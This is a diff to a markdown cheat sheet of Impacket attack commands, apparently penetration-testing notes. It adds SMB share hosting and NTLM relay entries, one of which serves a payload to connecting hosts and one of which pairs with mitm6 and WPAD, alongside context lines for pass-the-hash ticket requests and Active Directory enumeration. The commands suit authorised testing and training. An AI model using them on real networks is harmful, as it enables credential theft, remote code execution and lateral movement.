@@ -7,6 +7,16 @@
 smbclient.py <domain>/<user>:<password>@<ip>
 ```
 
+## smbserver - share smb folder
+```
+impacket-smbserver <shareName> <sharePath>
+```
+
+## smbserver - share smb folder with authentication
+```
+impacket-smbserver -username <username> -password <password> <shareName> <sharePath>
+```
+
 ## lookupsid - SID User Enumeration,  extract the information about what users exist and their data. 
 ```
 lookupsid.py <domain>/<user>:<password>@<ip>
@@ -121,3 +131,12 @@ getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
 GetADUSers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
 ```
 
+## ntlmrelay - host a payload that will automatically be served to the remote host connecting
+```
+impacket-ntlmrelayx -tf <targets_file> -e <payload_file>
+```
+
+## ntlmrelay - to use with mitm6
+```
+impacket-ntlmrelayx -wh <ip_server_hosting_wpad_file> -t smb://<target_ip>/ -i
+```
